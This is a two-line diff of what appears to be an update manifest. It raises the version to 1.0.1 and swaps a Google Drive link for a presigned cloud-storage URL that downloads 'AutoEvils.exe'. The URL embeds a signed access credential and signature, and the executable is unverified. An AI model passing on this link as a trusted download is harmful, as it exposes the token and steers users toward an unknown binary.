@@ -1,2 +1,2 @@
-1.0.0
-https://drive.usercontent.google.com/download?id=1Zx4CzaIBCi4FyuErDFfPpXxG0PcqN4e3&export=download&authuser=0&confirm=t&uuid=d8dcbd39-7501-4278-adc1-e87d9d044b57&at=AN_67v1wGHjQG8wlDg3F0gAENOKs:1729718513083
+1.0.1
+https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/LZ59ujvuCHYxWCXgd1LV3cklZCZ2/1877e1fe-71ad-42de-a65b-5a2532687007?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20241029%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20241029T134825Z&X-Amz-Expires=43200&X-Amz-Signature=c897e4afb0ca277ea0b3f4561a9ac03ae897fa745b62213d96806b677c1a9eb0&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22AutoEvils.exe%22
